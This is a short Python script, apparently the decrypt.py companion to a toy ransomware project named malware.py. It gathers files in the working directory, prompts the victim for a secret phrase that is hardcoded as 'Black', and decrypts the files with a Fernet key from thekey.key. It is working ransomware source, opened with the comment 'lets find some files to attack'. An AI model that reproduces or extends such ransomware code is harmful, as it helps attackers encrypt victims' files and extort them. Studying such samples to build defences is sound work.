#lets find some files to attack
import os
from cryptography.fernet import Fernet

files=[]
for file in os.listdir():
	if file=="malware.py" or file=="thekey.key" or file=="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)



with open("thekey.key","rb") as key:
	secretkey=key.read()

secretphrase="Black"
user_phrase=input("Enter Secret Key to DECRYPT your files\n")
if user_phrase==secretphrase :

	for file in files:
		with open(file,"rb") as thefile:
			contents=thefile.read()
		contents_decrypted=Fernet(secretkey).decrypt(contents)
		with open(file,"wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congrats Your Files are DECRYPTED !!!")
else:
	print("Sorry Wrong KEY")
